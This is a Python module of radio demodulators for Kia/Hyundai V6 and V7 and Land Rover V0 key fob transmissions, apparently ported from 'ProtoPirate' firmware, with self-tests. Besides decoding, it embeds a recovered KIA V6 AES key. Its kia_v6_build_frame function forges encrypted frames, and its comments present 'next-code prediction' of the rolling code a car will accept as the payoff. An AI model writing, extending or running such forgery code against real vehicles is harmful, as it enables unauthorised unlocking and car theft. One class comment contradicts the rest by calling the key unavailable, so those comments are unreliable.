#!/usr/bin/env python3
r"""arke_kia67_lr.py -- KIA/HYU V6, KIA/HYU V7 and Land Rover V0 RAW demodulators,
ported bit-exact from the ProtoPirate firmware (kia_v6.c / kia_v7.c /
land_rover_v0.c).

KIA/HYU V6  (te 200/400, 144-bit, Manchester):
    AES-128 encrypted rolling code. FULL DECRYPT (key recovered 2026-09-01, see
    KIA_V6_AES_KEY): reconstructs the 16-byte ciphertext, AES-128 decrypts it, and
    gates on the genuine CRC8 (poly 0x07, init 0xFF) that lives INSIDE the block.
    On a valid CRC it recovers serial(24b) + btn + counter(32b) and sets crc_ok=True;
    if a frame ever fails the CRC (unknown key variant / corruption) it falls back to
    the old decode-only behaviour (serial None, crc_ok None, ciphertext surfaced) so
    it never fabricates fields. The plaintext `fx` nibble-pair lives OUTSIDE the AES
    block and is always recovered.

KIA/HYU V7  (te 250/500, 64-bit, Manchester):
    Plaintext rolling code. 4-bit prepend + 60 Manchester bits -> 64-bit word,
    inverted. Fixed header byte 0x4C, then CRC8 (poly 0x7F, init 0x4C) over the
    first 7 bytes checked against byte 7. Recovers serial(28b) + btn + counter(16b).
    Genuine CRC => crc_ok=True ONLY when the CRC8 validates (mirrors the firmware's
    crc_valid gate that alone lets the frame fire its callback).

Land Rover V0  (te 250/500, 81-bit, differential PWM -- NOT Manchester):
    64-bit key + 16-bit tail + 1 extra bit. Recovers command-signature(24b) +
    serial(24b) + counter(9b) + button(from signature). Self-check: byte7 bits 6..3
    must be zero, byte7 bits 2..0 == a 3-bit linear check code over the counter, the
    16-bit tail must equal an exact expected pattern (0xFFFF/0x7FFF chosen by a 1-bit
    function of the counter) and the extra bit must be set. ~24 constraint bits =>
    crc_ok=True ONLY when all of that validates (mirrors land_rover_v0_validate_frame,
    the firmware's own "found" gate).

All three add exact-length gates and reject degenerate serials, per the arke
hardening rules. No bare length/preamble/sync match ever sets crc_ok=True.
"""
from arke_core import (Const, ProtoDecoder, diff, crc8, Manchester,
                       u64_to_bytes_be, bytes_to_u64_be)
import aes128

MASK64 = 0xFFFFFFFFFFFFFFFF

# KIA/HYU V6 AES-128 key -- RECOVERED (2026-09-01). ProtoPirate hides it behind two
# XOR masks (LOW 0x84AF25FB, HIGH 0x638766AB) over enclave-keystore entries type 11
# (kia_v6_a_key=0x638664A880AA23FC) and type 12 (kia_v6_b_key=0x6B8E6CA088A22BF4);
# those XOR down to the textbook key below. VERIFIED against two real captures
# (Kia_V6_N2, Hyundai_V6_Test): both decrypt to a valid CRC8(0x07,0xFF) AND satisfy
# the internal sbox[cnt&0xFF]==pt[12] invariant (~1e-9 to occur by chance).
KIA_V6_AES_KEY = bytes.fromhex("000102030405060708090a0b0c0d0e0f")


def _kia_v6_btn(b):
    return {0x01: "Lock", 0x02: "Unlock", 0x03: "Trunk", 0x04: "Panic",
            0x05: "Trunk", 0x0A: "Lock", 0x0B: "Unlock"}.get(b, "Btn:0x%X" % b)


def _reject_serial(serial):
    """Reject degenerate serials for both 24-bit and 28-bit fields."""
    return serial in (
        0,
        0xFFFFFF, 0x555555, 0xAAAAAA,          # 24-bit degenerate
        0x0FFFFFFF, 0x5555555, 0xAAAAAAA,       # 28-bit degenerate
    )


def _kia_v7_btn(b):
    return {0x01: "Lock", 0x02: "Unlock", 0x03: "Trunk", 0x08: "Trunk"}.get(b, "??")


def _lr_btn(b):
    return {0x02: "Lock", 0x04: "Unlock"}.get(b, "Unknown")


# ============================================================ KIA/HYU V6
# ts=200 tl=400 delta=100, 144 bits. Preamble = >=0x259 (601) short LOW pulses,
# then a LONG low (sync-1) + LONG high (sync-2). The frame prepends a fixed 4-bit
# nibble 0b1101, then Manchester-decodes 140 more bits (64+64+16), each stored
# group being bit-inverted (~). The resulting 16-byte block is the AES-128
# ciphertext; `fx` is the plaintext outside it. AES key unavailable on PC ->
# decode-only, crc_ok=None.
class KiaV6(ProtoDecoder):
    NAME = "KIA/HYU V6"
    CONST = Const(200, 400, 100, 144)

    def __init__(self):
        super().__init__()
        self.man = Manchester()
        self.header_count = 0
        self.bit_count = 0
        self.acc = 0            # rolling 64-bit accumulator (data_part1_high:low)
        self.sp1 = 0            # stored_part1 (64-bit, already inverted)
        self.sp2 = 0            # stored_part2 (64-bit, already inverted)
        self.part3 = 0          # data_part3 (16-bit, already inverted)

    def reset(self):
        super().reset()
        self.man.reset()
        self.header_count = 0
        self.bit_count = 0
        self.acc = 0
        self.sp1 = 0
        self.sp2 = 0
        self.part3 = 0

    def _commit(self):
        # Rebuild the 16-byte AES ciphertext exactly like kia_v6_decrypt() reads it.
        sp1_hi = (self.sp1 >> 32) & 0xFFFFFFFF
        sp1_lo = self.sp1 & 0xFFFFFFFF
        sp2_hi = (self.sp2 >> 32) & 0xFFFFFFFF
        sp2_lo = self.sp2 & 0xFFFFFFFF
        enc = [
            (sp1_hi >> 8) & 0xFF, sp1_hi & 0xFF,
            (sp1_lo >> 24) & 0xFF, (sp1_lo >> 16) & 0xFF,
            (sp1_lo >> 8) & 0xFF, sp1_lo & 0xFF,
            (sp2_hi >> 24) & 0xFF, (sp2_hi >> 16) & 0xFF,
            (sp2_hi >> 8) & 0xFF, sp2_hi & 0xFF,
            (sp2_lo >> 24) & 0xFF, (sp2_lo >> 16) & 0xFF,
            (sp2_lo >> 8) & 0xFF, sp2_lo & 0xFF,
            (self.part3 >> 8) & 0xFF, self.part3 & 0xFF,
        ]
        # fx_field: the two nibbles OUTSIDE the AES block (plaintext).
        fx_byte0 = (sp1_hi >> 24) & 0xFF
        fx_byte1 = (sp1_hi >> 16) & 0xFF
        fx_field = ((fx_byte0 & 0xF) << 4) | (fx_byte1 & 0xF)
        ciphertext = 0
        for b in enc:
            ciphertext = (ciphertext << 8) | b
        # AES-128 decrypt with the recovered key, then gate on the genuine CRC8 that
        # lives INSIDE the block (poly 0x07, init 0xFF; firmware accepts diff < 2).
        pt = aes128.decrypt_block(KIA_V6_AES_KEY, bytes(enc))
        calc = crc8(pt[:15], 0x07, 0xFF)
        if (calc ^ pt[15]) < 2:
            serial = (pt[4] << 16) | (pt[5] << 8) | pt[6]
            btn = pt[7] & 0x0F
            cnt = (pt[8] << 24) | (pt[9] << 16) | (pt[10] << 8) | pt[11]
            if not _reject_serial(serial):
                self.emit({"serial": serial, "btn": btn,
                           "btn_name": _kia_v6_btn(btn), "cnt": cnt,
                           "data": ciphertext, "fx": fx_field, "aes": True,
                           "plain": bytes_to_u64_be(pt[:8]) << 64 | bytes_to_u64_be(pt[8:]),
                           "crc_ok": True})
                return
        # CRC failed to validate (unknown key variant / corrupt frame): stay honest
        # and fall back to decode-only -- surface the ciphertext, no fabricated fields.
        self.emit({"serial": None, "btn": None, "btn_name": "encrypted",
                   "cnt": None, "data": ciphertext, "fx": fx_field,
                   "aes": True, "crc_ok": None})

    def feed(self, level, duration):
        d = self.d
        c = self.CONST
        st = d.parser_step
        if st == 0:  # Reset
            if level == 0:
                return
            if diff(duration, c.te_short) < c.te_delta:
                d.parser_step = 1
                d.te_last = duration
                self.header_count = 0
                self.man.reset()
            return
        elif st == 1:  # WaitFirstHigh (only LOW pulses matter)
            if level != 0:
                return
            diff_short = diff(duration, c.te_short)
            diff_long = diff(duration, c.te_long)
            dmin = diff_long if diff_long < diff_short else diff_short
            if diff_long < c.te_delta and diff_long < diff_short:
                if self.header_count >= 0x259:
                    self.header_count = 0
                    d.te_last = duration
                    d.parser_step = 2
                    return
            if dmin >= c.te_delta:
                d.parser_step = 0
                return
            if diff(d.te_last, c.te_short) < c.te_delta:
                d.te_last = duration
                self.header_count += 1
                return
            else:
                d.parser_step = 0
                return
        elif st == 2:  # WaitLongHigh
            if level == 0:
                d.parser_step = 0
                return
            diff_long_check = diff(duration, c.te_long)
            diff_short_check = diff(duration, c.te_short)
            if diff_long_check >= c.te_delta and diff_short_check >= c.te_delta:
                d.parser_step = 0
                return
            if diff(d.te_last, c.te_long) >= c.te_delta:
                d.parser_step = 0
                return
            # prepend fixed nibble 1101 (add_bit 1,1,0,1)
            self.acc = 0b1101 & MASK64
            self.bit_count = 4
            d.parser_step = 3
            return
        elif st == 3:  # Data
            if diff(duration, c.te_short) < c.te_delta:
                ev = 2 if level else 0        # ShortHigh : ShortLow (inverted polarity)
            elif diff(duration, c.te_long) < c.te_delta:
                ev = 6 if level else 4        # LongHigh : LongLow
            else:
                d.parser_step = 0
                return
            bit = self.man.advance(ev)
            if bit is not None:
                self.acc = ((self.acc << 1) | (1 if bit else 0)) & MASK64
                self.bit_count += 1
                if self.bit_count == 0x40:
                    self.sp1 = (~self.acc) & MASK64
                    self.acc = 0
                elif self.bit_count == 0x80:
                    self.sp2 = (~self.acc) & MASK64
                    self.acc = 0
            d.te_last = duration
            if self.bit_count != c.min_bits:      # exact-length gate: 144
                return
            self.part3 = (~self.acc) & 0xFFFF
            self._commit()
            self.acc = 0
            self.bit_count = 0
            d.parser_step = 0


def kia_v6_build_frame(fx, serial, btn, cnt):
    """Encrypt ONE KIA/HYU V6 frame with the recovered key -> (part1, part2, part3)
    exactly as a .sub stores them (Key / Key_2 / Key_3). Inverse of KiaV6._commit;
    port of ProtoPirate kia_v6_encrypt_payload. Feeding cnt+1 yields the NEXT code the
    receiver will accept -- next-code prediction, the payoff of recovering the AES key.
    Round-trip self-tested (encrypt cnt -> decrypt -> same serial/cnt/valid CRC)."""
    p = bytearray(16)
    p[0] = fx & 0xFF
    p[4] = (serial >> 16) & 0xFF
    p[5] = (serial >> 8) & 0xFF
    p[6] = serial & 0xFF
    p[7] = btn & 0x0F
    p[8] = (cnt >> 24) & 0xFF
    p[9] = (cnt >> 16) & 0xFF
    p[10] = (cnt >> 8) & 0xFF
    p[11] = cnt & 0xFF
    p[12] = aes128._SBOX[cnt & 0xFF]
    p[15] = crc8(bytes(p[:15]), 0x07, 0xFF)
    ct = aes128.encrypt_block(KIA_V6_AES_KEY, bytes(p))
    fx_hi = 0x20 | (fx >> 4)
    fx_lo = fx & 0x0F
    part1 = ((fx_hi << 56) | (fx_lo << 48) | (ct[0] << 40) | (ct[1] << 32) |
             (ct[2] << 24) | (ct[3] << 16) | (ct[4] << 8) | ct[5])
    part2 = ((ct[6] << 56) | (ct[7] << 48) | (ct[8] << 40) | (ct[9] << 32) |
             (ct[10] << 24) | (ct[11] << 16) | (ct[12] << 8) | ct[13])
    part3 = (ct[14] << 8) | ct[15]
    return part1, part2, part3


# ============================================================ KIA/HYU V7
# ts=250 tl=500 delta=100, 64 bits. Preamble = >15 short pairs, then a LONG high
# (sync) prepends 0b1011, then 60 Manchester bits -> 64-bit word. Invert; top byte
# must be header 0x4C; CRC8(poly 0x7F, init 0x4C) over bytes[0..6] == byte7.
class KiaV7(ProtoDecoder):
    NAME = "KIA/HYU V7"
    CONST = Const(250, 500, 100, 64)
    HEADER = 0x4C

    def __init__(self):
        super().__init__()
        self.man = Manchester()
        self.preamble_count = 0

    def reset(self):
        super().reset()
        self.man.reset()
        self.preamble_count = 0

    def _commit(self):
        data = (~self.d.decode_data) & MASK64          # candidate = ~decode_data
        hdr = (data >> 56) & 0xFF
        if hdr != self.HEADER:                          # structural gate (not enough alone)
            return
        b = u64_to_bytes_be(data)
        serial = (((b[3] << 20) | (b[4] << 12) | (b[5] << 4) | (b[6] >> 4))
                  & 0x0FFFFFFF)
        counter = (b[1] << 8) | b[2]
        btn = b[6] & 0x0F
        crc_calc = crc8(b[0:7], 0x7F, 0x4C)
        crc_pkt = b[7]
        if crc_calc != crc_pkt:                         # genuine CRC gate
            return
        if _reject_serial(serial):
            return
        self.emit({"serial": serial, "btn": btn, "btn_name": _kia_v7_btn(btn),
                   "cnt": counter, "data": data, "crc_ok": True})

    def feed(self, level, duration):
        d = self.d
        c = self.CONST
        st = d.parser_step
        short = diff(duration, c.te_short) < c.te_delta
        long_ = diff(duration, c.te_long) < c.te_delta
        if st == 0:  # Reset
            if level and short:
                d.parser_step = 1
                d.te_last = duration
                self.preamble_count = 0
                self.man.reset()
        elif st == 1:  # Preamble
            if level:
                if long_ and (diff(d.te_last, c.te_short) < c.te_delta):
                    if self.preamble_count > 15:        # KIA_V7_PREAMBLE_MIN_PAIRS-1
                        d.decode_data = 0
                        d.decode_count_bit = 0
                        self.preamble_count = 0
                        d.add_bit(1); d.add_bit(0); d.add_bit(1); d.add_bit(1)
                        d.te_last = duration
                        d.parser_step = 2
                    else:
                        d.parser_step = 0
                elif short:
                    d.te_last = duration
                else:
                    d.parser_step = 0
            else:
                if short and (diff(d.te_last, c.te_short) < c.te_delta):
                    self.preamble_count += 1
                else:
                    d.parser_step = 0
        elif st == 2:  # SyncLow
            if (not level) and short and (diff(d.te_last, c.te_long) < c.te_delta):
                d.te_last = duration
                d.parser_step = 3
        elif st == 3:  # Data
            if short:
                ev = 2 if level else 0
            elif long_:
                ev = 6 if level else 4
            else:
                ev = 8  # reset event (only applied when short/long, mirroring the C)
            if short or long_:
                bit = self.man.advance(ev)
                if bit is not None:
                    d.add_bit(1 if bit else 0)
            if d.decode_count_bit == 64:               # exact-length gate
                self._commit()
                d.decode_data = 0
                d.decode_count_bit = 0
                d.parser_step = 0
                self.man.reset()


# ============================================================ Land Rover V0
# ts=250 tl=500 delta=100, 81 bits. Differential PWM (NOT Manchester). Preamble =
# >=64 short pairs, then two ~750us sync pulses. First bit forced to 1 at sync.
class LandRoverV0(ProtoDecoder):
    NAME = "Land Rover V0"
    CONST = Const(250, 500, 100, 81)
    SYNC_US = 750
    SYNC_DELTA = 120
    MIN_PREAMBLE_PAIRS = 64
    SIG_UNLOCK = 0xA285E3
    SIG_LOCK = 0xC20363
    BTN_LOCK = 0x02
    BTN_UNLOCK = 0x04
    BTN_UNKNOWN = 0x00

    def __init__(self):
        super().__init__()
        self.preamble_count = 0
        self.raw = bytearray(10)
        self.bit_count = 0
        self.extra_bit = False
        self.previous_bit = True
        self.boundary_pad_skipped = False
        self.pending_short = False

    def reset(self):
        super().reset()
        self.preamble_count = 0
        self.raw = bytearray(10)
        self.bit_count = 0
        self.extra_bit = False
        self.previous_bit = True
        self.boundary_pad_skipped = False
        self.pending_short = False

    def _is_short(self, dur):
        c = self.CONST
        return diff(dur, c.te_short) < c.te_delta

    def _is_long(self, dur):
        c = self.CONST
        return diff(dur, c.te_long) < c.te_delta

    def _is_sync(self, dur):
        return diff(dur, self.SYNC_US) < self.SYNC_DELTA

    def _add_bit(self, bit):
        if self.bit_count < 80:
            bi = self.bit_count // 8
            off = 7 - (self.bit_count % 8)
            if bit:
                self.raw[bi] |= (1 << off)
        elif self.bit_count == 80:
            self.extra_bit = bool(bit)
        else:
            return False
        self.bit_count += 1
        return True

    @staticmethod
    def _calc_check(count):
        c0 = ((count >> 1) ^ (count >> 2) ^ (count >> 3) ^ (count >> 4) ^ (count >> 6)) & 1
        c1 = ((count >> 0) ^ (count >> 2) ^ (count >> 3) ^ (count >> 4) ^ (count >> 5)
              ^ (count >> 6) ^ 1) & 1
        c2 = ((count >> 1) ^ (count >> 3) ^ (count >> 4) ^ (count >> 5) ^ (count >> 6)) & 1
        return c0 | (c1 << 1) | (c2 << 2)

    @staticmethod
    def _calc_tail(count):
        msb = ((count >> 0) ^ (count >> 2) ^ (count >> 4) ^ (count >> 5)) & 1
        return 0xFFFF if msb else 0x7FFF

    def _btn_from_sig(self, sig):
        if sig == self.SIG_UNLOCK:
            return self.BTN_UNLOCK
        if sig == self.SIG_LOCK:
            return self.BTN_LOCK
        return self.BTN_UNKNOWN

    def _process_transition(self, level, duration):
        # differential PWM decoder (land_rover_v0_process_transition)
        if not self.boundary_pad_skipped:
            if level and self._is_short(duration):
                self.boundary_pad_skipped = True
                return True
            self.boundary_pad_skipped = True

        if self.pending_short:
            if (not self.previous_bit) and (not level) and self._is_short(duration):
                self.pending_short = False
                return self._add_bit(False)
            elif self.previous_bit and level and self._is_short(duration):
                self.pending_short = False
                return self._add_bit(True)
            return False

        if not self.previous_bit:
            if level and self._is_long(duration):
                self.previous_bit = True
                return self._add_bit(True)
            elif level and self._is_short(duration):
                self.pending_short = True
                return True
            return False

        if (not level) and self._is_long(duration):
            self.previous_bit = False
            return self._add_bit(False)
        elif (not level) and self._is_short(duration):
            self.pending_short = True
            return True
        return False

    def _finish_frame(self):
        key = bytes_to_u64_be(self.raw[0:8])
        tail = (self.raw[8] << 8) | self.raw[9]
        kb = u64_to_bytes_be(key)
        count = (kb[6] << 1) | ((kb[7] >> 7) & 1)
        expected_check = self._calc_check(count)
        expected_tail = self._calc_tail(count)
        check_ok = ((kb[7] & 0x78) == 0) and ((kb[7] & 0x07) == expected_check)
        tail_ok = (tail == expected_tail) and self.extra_bit
        if not (check_ok and tail_ok):        # firmware's found-gate (real checksum)
            return
        sig = (kb[0] << 16) | (kb[1] << 8) | kb[2]
        serial = (kb[3] << 16) | (kb[4] << 8) | kb[5]
        btn = self._btn_from_sig(sig)
        check = kb[7] & 0x07
        if _reject_serial(serial):
            return
        self.emit({"serial": serial, "btn": btn, "btn_name": _lr_btn(btn),
                   "cnt": count, "data": key, "sig": sig, "check": check,
                   "tail": tail, "crc_ok": True})

    def feed(self, level, duration):
        d = self.d
        st = d.parser_step
        if st == 0:  # Reset
            if level and self._is_short(duration):
                self.preamble_count = 0
                d.parser_step = 1
        elif st == 1:  # PreambleLow
            if (not level) and self._is_short(duration):
                self.preamble_count += 1
                d.parser_step = 2
            else:
                d.parser_step = 0
        elif st == 2:  # PreambleHigh
            if level and self._is_short(duration):
                d.parser_step = 1
            elif (level and self._is_sync(duration)
                  and self.preamble_count >= self.MIN_PREAMBLE_PAIRS):
                d.parser_step = 3
            else:
                d.parser_step = 0
        elif st == 3:  # SyncLow
            if (not level) and self._is_sync(duration):
                self.raw = bytearray(10)
                self.bit_count = 0
                self.extra_bit = False
                self.previous_bit = True
                self.boundary_pad_skipped = False
                self.pending_short = False
                self._add_bit(True)          # first bit forced to 1
                d.parser_step = 4
            else:
                d.parser_step = 0
        elif st == 4:  # Data
            if not self._process_transition(level, duration):
                d.parser_step = 0
            elif self.bit_count == self.CONST.min_bits:   # exact-length gate: 81
                self._finish_frame()
                d.parser_step = 0
        d.te_last = duration


ALL = [KiaV6, KiaV7, LandRoverV0]


# ============================================================ self-test
if __name__ == "__main__":
    import sys, traceback

    S = 250
    L = 500

    def smoke(dec, pulses):
        """Feed a stream; fail hard on any exception."""
        try:
            for lvl, dur in pulses:
                dec.feed(lvl, dur)
        except Exception:
            traceback.print_exc()
            print("FAIL", dec.NAME, "(exception in feed)")
            sys.exit(1)

    # ---- KIA V6: smoke (walk parser) + direct decode-only emit path ----
    v6 = KiaV6()
    p6 = []
    p6.append((True, 200))                       # step0 -> step1
    for _ in range(700):                          # >601 short LOW increments
        p6.append((False, 200))                   # LOW short (increments header_count)
        p6.append((True, 200))                    # HIGH short (ignored in step1)
    p6.append((False, 400))                       # LONG low -> step2
    p6.append((True, 400))                        # LONG high -> step3 (prepend)
    for i in range(400):                          # data pulses (manchester)
        p6.append((i % 2 == 0, 200 if i % 3 else 400))
    p6.append((False, 12000))                     # gap
    smoke(v6, p6)

    # POSITIVE full-decrypt path: real Kia_V6_N2 capture -> valid CRC + fields.
    v6b = KiaV6()
    v6b.sp1 = 0xDA07827EFCA4EA82
    v6b.sp2 = 0xA7256C3073331F84
    v6b.part3 = 0x2BF7
    v6b._commit()
    assert v6b.results, "KIA V6 commit produced no frame"
    r6 = v6b.results[0]
    assert r6["crc_ok"] is True, "KIA V6 real capture must validate CRC (full decrypt)"
    assert r6["serial"] == 0x109DA7, "KIA V6 serial mismatch: %r" % r6["serial"]
    assert r6["cnt"] == 0xC106C04B, "KIA V6 counter mismatch: %r" % r6["cnt"]
    assert r6["fx"] == 0xA7, "KIA V6 fx nibble-pair extraction mismatch"
    assert r6["data"] == 0x827efca4ea82a7256c3073331f842bf7, "KIA V6 ciphertext mismatch"
    # second real capture (Hyundai_V6_Test)
    v6c = KiaV6()
    v6c.sp1 = 0xED028AE751F0ECAE
    v6c.sp2 = 0xDA181151A0E5669D
    v6c.part3 = 0x0E02
    v6c._commit()
    assert v6c.results[0]["serial"] == 0x1AD9C3 and v6c.results[0]["cnt"] == 0x2012, \
        "KIA V6 Hyundai vector mismatch"
    # NEGATIVE: one-bit corruption of part3 -> CRC fails -> honest decode-only fallback.
    v6n = KiaV6()
    v6n.sp1 = 0xDA07827EFCA4EA82
    v6n.sp2 = 0xA7256C3073331F84
    v6n.part3 = 0x2BF6           # deterministic CRC-fail vector
    v6n._commit()
    rn = v6n.results[0]
    assert rn["crc_ok"] is None and rn["serial"] is None, \
        "KIA V6 must fall back to decode-only when CRC fails (no fabricated fields)"
    # NEXT-CODE prediction: encrypt cnt+1, decrypt our own output, confirm it validates.
    np1, np2, np3 = kia_v6_build_frame(0xD2, 0x1AD9C3, 0x1, 0x2013)
    vn = KiaV6(); vn.sp1, vn.sp2, vn.part3 = np1, np2, np3; vn._commit()
    rr = vn.results[0]
    assert rr["crc_ok"] is True and rr["serial"] == 0x1AD9C3 and rr["cnt"] == 0x2013, \
        "KIA V6 next-code build/round-trip failed"
    print("OK", KiaV6.NAME, "(full AES decrypt + next-code)")

    # ---- KIA V7: smoke + direct CRC-gated emit path (pos + neg) ----
    v7 = KiaV7()
    p7 = [(True, 250)]
    for _ in range(30):
        p7.append((False, 250)); p7.append((True, 250))
    p7.append((True, 500))                        # long sync
    p7.append((False, 250))                       # sync low -> data
    for i in range(200):
        p7.append((i % 2 == 0, 250 if i % 2 else 500))
    p7.append((False, 12000))
    smoke(v7, p7)

    # positive: valid header + CRC -> crc_ok True, fields recovered
    b = [0x4C, 0x12, 0x34, 0x0A, 0xBC, 0xDE, 0xF5, 0x00]
    b[7] = crc8(b[0:7], 0x7F, 0x4C)
    data = bytes_to_u64_be(b)
    v7c = KiaV7()
    v7c.d.decode_data = (~data) & MASK64
    v7c.d.decode_count_bit = 64
    v7c._commit()
    assert v7c.results, "KIA V7 valid frame did not emit"
    r7 = v7c.results[0]
    exp_serial = ((b[3] << 20) | (b[4] << 12) | (b[5] << 4) | (b[6] >> 4)) & 0x0FFFFFFF
    assert r7["serial"] == exp_serial, "KIA V7 serial mismatch"
    assert r7["cnt"] == ((b[1] << 8) | b[2]), "KIA V7 counter mismatch"
    assert r7["btn"] == (b[6] & 0x0F), "KIA V7 btn mismatch"
    assert r7["crc_ok"] is True, "KIA V7 crc_ok must be True on CRC match"
    # negative: corrupt CRC -> no emit
    bbad = list(b)
    bbad[7] ^= 0xFF
    dbad = bytes_to_u64_be(bbad)
    v7n = KiaV7()
    v7n.d.decode_data = (~dbad) & MASK64
    v7n.d.decode_count_bit = 64
    v7n._commit()
    assert not v7n.results, "KIA V7 must reject bad CRC"
    # negative: wrong header -> no emit
    bhdr = list(b); bhdr[0] = 0x00
    bhdr[7] = crc8(bhdr[0:7], 0x7F, 0x4C)
    dhdr = bytes_to_u64_be(bhdr)
    v7h = KiaV7()
    v7h.d.decode_data = (~dhdr) & MASK64
    v7h.d.decode_count_bit = 64
    v7h._commit()
    assert not v7h.results, "KIA V7 must reject wrong header"
    print("OK", KiaV7.NAME)

    # ---- Land Rover V0: full feed->lock end-to-end + negative checksum ----
    def lr_stream(serial, count, sig=LandRoverV0.SIG_UNLOCK):
        kb = [0] * 8
        kb[0] = (sig >> 16) & 0xFF
        kb[1] = (sig >> 8) & 0xFF
        kb[2] = sig & 0xFF
        kb[3] = (serial >> 16) & 0xFF
        kb[4] = (serial >> 8) & 0xFF
        kb[5] = serial & 0xFF
        kb[6] = (count >> 1) & 0xFF
        kb[7] = ((count & 1) << 7) | LandRoverV0._calc_check(count)
        key = bytes_to_u64_be(kb)
        tail = LandRoverV0._calc_tail(count)
        raw_bits = [(key >> (63 - i)) & 1 for i in range(64)]      # raw 0..63
        raw_bits += [(tail >> (15 - j)) & 1 for j in range(16)]    # raw 64..79
        raw_bits.append(1)                                          # extra (raw 80)
        pulses = []
        for _ in range(100):                                       # preamble
            pulses.append((True, S)); pulses.append((False, S))
        pulses.append((True, 750)); pulses.append((False, 750))    # sync
        pulses.append((True, S))                                   # boundary pad
        prev = True
        for idx in range(1, 81):                                   # differential raw 1..80
            bit = raw_bits[idx]
            if (not prev) and (not bit):
                pulses.append((True, S)); pulses.append((False, S))
            elif (not prev) and bit:
                pulses.append((True, L))
            elif prev and (not bit):
                pulses.append((False, L))
            else:
                pulses.append((False, S)); pulses.append((True, S))
            prev = bit
        pulses.append((False, 50000))                              # trailing gap
        return pulses, key, tail

    lr = LandRoverV0()
    ser_in, cnt_in = 0xA1B2C3, 0x155
    stream, key_exp, tail_exp = lr_stream(ser_in, cnt_in)
    smoke(lr, stream)
    assert lr.results, "Land Rover V0 did not lock on a valid synthetic frame"
    rl = lr.results[0]
    assert rl["serial"] == ser_in, "Land Rover V0 serial mismatch (%06X)" % rl["serial"]
    assert rl["cnt"] == cnt_in, "Land Rover V0 counter mismatch"
    assert rl["btn"] == LandRoverV0.BTN_UNLOCK, "Land Rover V0 button mismatch"
    assert rl["data"] == key_exp, "Land Rover V0 key mismatch"
    assert rl["tail"] == tail_exp, "Land Rover V0 tail mismatch"
    assert rl["crc_ok"] is True, "Land Rover V0 crc_ok must be True on valid check"
    # negative: break the check byte -> no lock
    lrn = LandRoverV0()
    bad_stream = list(stream)
    lrbad = LandRoverV0()
    # craft a raw frame with a deliberately wrong check code and finish directly
    kb = [0xA2, 0x85, 0xE3, 0xA1, 0xB2, 0xC3, (cnt_in >> 1) & 0xFF,
          ((cnt_in & 1) << 7) | ((LandRoverV0._calc_check(cnt_in) ^ 0x1) & 0x07)]
    lrbad.raw = bytearray(kb) + bytes([(tail_exp >> 8) & 0xFF, tail_exp & 0xFF])
    lrbad.extra_bit = True
    lrbad._finish_frame()
    assert not lrbad.results, "Land Rover V0 must reject a bad check code"
    print("OK", LandRoverV0.NAME)

    print("ALL DECODERS OK")
